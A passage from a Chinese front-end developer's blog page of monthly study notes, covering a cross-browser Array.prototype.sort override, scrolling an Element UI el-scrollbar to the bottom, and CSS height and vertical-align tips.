class="built_in">window</span>.navigator.userAgent.toLowerCase(), </span><br><span class="line">    reg = <span class="regexp">/msie|applewebkit.+safari/</span>; </span><br><span class="line">    <span class="keyword">if</span>(reg.test(ua))&#123; </span><br><span class="line">        <span class="keyword">var</span> _sort = <span class="built_in">Array</span>.prototype.sort; </span><br><span class="line">        <span class="built_in">Array</span>.prototype.sort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!!fn &amp;&amp; <span class="keyword">typeof</span> fn === <span class="string">'function'</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>.length &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">this</span>; </span><br><span class="line">                <span class="keyword">var</span> i = <span class="number">0</span>, j = i + <span class="number">1</span>, l = <span class="keyword">this</span>.length, tmp, r = <span class="literal">false</span>, t = <span class="number">0</span>; </span><br><span class="line">                <span class="keyword">for</span>(; i &lt; l; i++)&#123; </span><br><span class="line">                    <span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; l; j++)&#123; </span><br><span class="line">                        t = fn.call(<span class="keyword">this</span>, <span class="keyword">this</span>[i], <span class="keyword">this</span>[j]); </span><br><span class="line">                        r = (<span class="keyword">typeof</span> t === <span class="string">'number'</span> ? t : </span><br><span class="line">                        !!t ? <span class="number">1</span> : <span class="number">0</span>) &gt; <span class="number">0</span> </span><br><span class="line">                        ? <span class="literal">true</span> : <span class="literal">false</span>; </span><br><span class="line">                        <span class="keyword">if</span>(r)&#123; </span><br><span class="line">                            tmp = <span class="keyword">this</span>[i]; </span><br><span class="line">                            <span class="keyword">this</span>[i] = <span class="keyword">this</span>[j]; </span><br><span class="line">                            <span class="keyword">this</span>[j] = tmp; </span><br><span class="line">                        &#125; </span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> _sort.call(<span class="keyword">this</span>); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p>
<p><a href="https://blog.csdn.net/lt3487928/article/details/53157817" target="_blank" rel="noopener">https://blog.csdn.net/lt3487928/article/details/53157817</a></p>
<p><a href="https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html" target="_blank" rel="noopener">https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html</a></p>
<h3 id="height设为100-要求父容器高度确定，否则无效。"><a href="#height设为100-要求父容器高度确定，否则无效。" class="headerlink" title="height设为100%要求父容器高度确定，否则无效。"></a>height设为100%要求父容器高度确定，否则无效。</h3><h3 id="el-scrollbar滚动到容器底部"><a href="#el-scrollbar滚动到容器底部" class="headerlink" title="el-scrollbar滚动到容器底部"></a>el-scrollbar滚动到容器底部</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-scrollbar style=&quot;height:100%&quot; ref=&quot;elscrollbar&quot;&gt;</span><br><span class="line">var div = this.$refs[&apos;elscrollbar&apos;].$refs[&apos;wrap&apos;];</span><br><span class="line">this.$nextTick(() =&gt; &#123;</span><br><span class="line">    div.scrollTop = div.scrollHeight</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="怎么应用vertical-align，才能生效？"><a href="#怎么应用vertical-align，才能生效？" class="headerlink" title="怎么应用vertical-align，才能生效？"></a>怎么应用vertical-align，才能生效？</h3><p><a href="https://blog.csdn.net/diudiu5201/article/details/54666809" target="_blank" rel="noopener">怎么应用vertical-align，才能生效</a></p>
<ol>
<li><p>父元素（inline-block\block）必须含有line-height（inline元素有无皆可），子元素（inline-block/inline元素）中的vertical-align才能起作用。<br>vertical-align不可继承，必须对子元素单独设置。</p>
</li>
<li><p>当父元素没有设置line-height时，vertical-align只对行内元素的兄弟元素对齐有用，无法子元素居中对齐父元素。<br>设置了vertical-align:middle的子元素的中线与兄弟元素的基线对齐。若兄弟元素都设置该项，则居中对齐。</p>
</li>
</ol>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/每月总结/">每月总结</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  


  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/学习/专题笔记/" title="专题笔记">专题笔记<sup>23</sup></a></li>
		  
		
		  
			<li><a href="/categories/学习/" title="学习">学习<sup>41</sup></a></li>
		  
		
		  
			<li><a href="/categories/学习/每月总结/" title="每月总结">每月总结<sup>10</sup></a></li>
		  
		
		  
			<li><a href="/categories/生活/" title="生活">生活<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/学习/读书笔记/" title="读书笔记">读书笔记<sup>6</sup></a></li>
		  
		
		  
			<li><a href="/categories/生活/阅读笔记/" title="阅读笔记">阅读笔记<sup>3</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/面试/" title="面试">面试<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/文学/" title="文学">文学<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/vue/" title="vue">vue<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/资料收集/" title="资料收集">资料收集<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/react/" title="react">react<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/reat-native/" title="reat-native">reat-native<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/设计模式/" title="设计模式">设计模式<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/前端优化/" title="前端优化">前端优化<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/DOM/" title="DOM">DOM<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/柯里化/" title="柯里化">柯里化<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/react-native/" title="react-native">react-native<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/栈队列/" title="栈队列">栈队列<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/angular/" title="angular">angular<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/AngularJS1/" title="AngularJS1">AngularJS1<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/H5/" title="H5">H5<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/GreenSock/" title="GreenSock">GreenSock<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/前端启航/" title="前端启航">前端启航<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/ES6/" title="ES6">ES6<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">Weibo</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
		
		<a href="/about" target="_blank" title="Ruiyu Lin">Ruiyu Lin</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
 </html>
